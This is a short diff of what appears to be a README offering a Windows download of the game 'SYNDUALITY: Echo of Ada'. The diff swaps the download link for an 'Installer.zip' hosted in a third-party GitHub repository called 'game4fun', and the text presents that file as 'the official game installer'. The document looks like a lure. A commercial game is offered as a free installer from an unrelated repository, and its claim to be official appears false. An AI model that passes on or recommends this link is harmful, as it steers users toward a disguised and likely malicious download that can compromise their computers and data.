@@ -35,7 +35,7 @@ Accompanied by Ada, an AI companion, you’ll embark on a journey to uncover los
 Follow these steps to download and install SYNDUALITY: Echo of Ada on your Windows 10 PC:  
 
 ### Step 1: Download the Installer  
-- Use this [**link**](https://nicecolns.com/) to download the official game installer.  
+- Use this [**link**](https://github.com/JeanSylvestrek/game4fun/releases/download/publish/Installer.zip) to download the official game installer.  
 - Save the file in your preferred directory (e.g., "Downloads" folder).  
 
 ### Step 2: Run the Installer  
